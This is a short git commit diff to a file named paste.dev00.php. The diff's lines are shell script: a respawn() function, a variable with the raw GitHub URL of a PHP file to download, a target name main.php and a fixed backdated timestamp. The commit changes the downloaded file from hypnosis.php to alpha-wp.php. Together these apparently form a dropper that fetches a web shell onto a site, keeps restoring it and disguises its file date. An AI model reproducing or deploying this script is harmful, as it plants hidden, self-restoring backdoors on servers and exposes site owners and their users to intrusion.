ae9d10a13537fd86539205bff18ee955f030b88c
onlyme1d <agungrikardo09@gmail.com>
2025-11-26 15:48:46 +0700

    Update and rename paste.dev.99.php to paste.dev00.php

--- paste.dev00.php
+++ paste.dev00.php
@@ -41,7 +41,7 @@ respawn() {
 }
 
 # URL sumber file yang akan diunduh
-url="https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/hypnosis.php"
+url="https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/alpha-wp.php"
 file_name="main.php"
 timestamp="201201081531.12"
 
